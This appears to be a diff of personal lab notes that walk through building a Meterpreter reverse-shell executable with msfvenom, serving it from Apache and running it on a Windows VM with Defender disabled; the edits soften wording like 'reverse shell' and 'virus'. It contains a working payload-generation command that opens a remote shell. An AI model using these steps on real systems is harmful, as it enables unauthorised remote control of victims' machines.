@@ -1,7 +1,7 @@
-## shortcut on creating revershell with meterpreter/msf work in progress##
+## shortcut on creating simple meterpreter session for fun##
 
 ##launch terminal##
-# run the following to escalate to root#
+# escalate to root #
 ~$ sudo su
 
 # run the following to create msfvenom reverse shell payload *.exe and place it into your webserver directory #
@@ -9,14 +9,14 @@
 └─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > /var/www/html/fun.exe  
 
 
-# the wares have been created run the following to start the appache webserver #
+# the wares have been created run the following to start the appache webserver(or simple python server)#
 ┌──(root💀kali )-[/g]
 └─# service apache2 start
 
 
 ##### Go to Windows machine ######
 
-### Turn off Windows defender, allow the virus to come thru because it will be detected##
+### Turn off Windows defender ##
 
  # Launch browser in windows. download and run executable msfvenom created #
 open http://kaliipaddress/fun.exe 
@@ -89,4 +89,4 @@ PORT   STATE  SERVICE<br>
 80/tcp closed http<br>
 
 # meterpreter<br>
-Metasploit/Meterpreter reverse shell from Kali to Windows VM<br>
+Metasploit/Meterpreter session from Kali to Windows VM<br>
